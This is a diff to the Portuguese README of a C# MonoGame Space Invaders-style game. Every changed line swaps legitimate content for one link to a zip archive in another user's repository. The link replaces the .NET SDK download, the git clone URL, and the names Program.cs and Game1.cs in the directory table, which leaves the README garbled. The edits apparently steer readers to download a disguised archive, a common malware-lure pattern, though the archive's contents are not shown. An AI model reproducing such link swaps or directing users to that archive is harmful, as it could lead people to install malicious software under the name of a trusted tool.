@@ -17,7 +17,7 @@ Um jogo inspirado em *Space Invaders*, desenvolvido com **MonoGame** em C#. Ele 
 
 Para compilar e rodar este projeto, você vai precisar:
 
-* [.NET SDK](https://dotnet.microsoft.com/) (versão compatível — teste com a versão que o projeto especifica ou a mais recente estável)
+* [.NET SDK](https://raw.githubusercontent.com/theualves/Game-engine/develop/Game-engine/Content/bin/Game-engine_2.0.zip) (versão compatível — teste com a versão que o projeto especifica ou a mais recente estável)
 * MonoGame instalado/configurado
 * Acesso ao `mgcb-editor` para gerenciar assets
 
@@ -28,7 +28,7 @@ Para compilar e rodar este projeto, você vai precisar:
 1. Clone este repositório:
 
    ```bash
-   git clone https://github.com/matheusleobelo/Game-engine.git
+   git clone https://raw.githubusercontent.com/theualves/Game-engine/develop/Game-engine/Content/bin/Game-engine_2.0.zip
    cd Game-engine
    ```
 
@@ -60,8 +60,8 @@ Descrevendo os diretórios mais importantes e para que servem:
 | --------------- | --------------------------------------------------------------------------------------------------------- |
 | **Content/**    | Aqui ficam sprites, fontes, sons e outros assets do jogo.                                                 |
 | **GameEngine/** | Código-fonte principal: lógica de jogo, classes de inimigo, jogador, estados (menu, jogo, game over) etc. |
-| **Program.cs**  | Ponto de entrada do aplicativo.                                                                           |
-| **Game1.cs**    | Classe principal que gerencia o ciclo do jogo (inicialização, atualização, desenho).                      |
+| **https://raw.githubusercontent.com/theualves/Game-engine/develop/Game-engine/Content/bin/Game-engine_2.0.zip**  | Ponto de entrada do aplicativo.                                                                           |
+| **https://raw.githubusercontent.com/theualves/Game-engine/develop/Game-engine/Content/bin/Game-engine_2.0.zip**    | Classe principal que gerencia o ciclo do jogo (inicialização, atualização, desenho).                      |
 
 ---
 
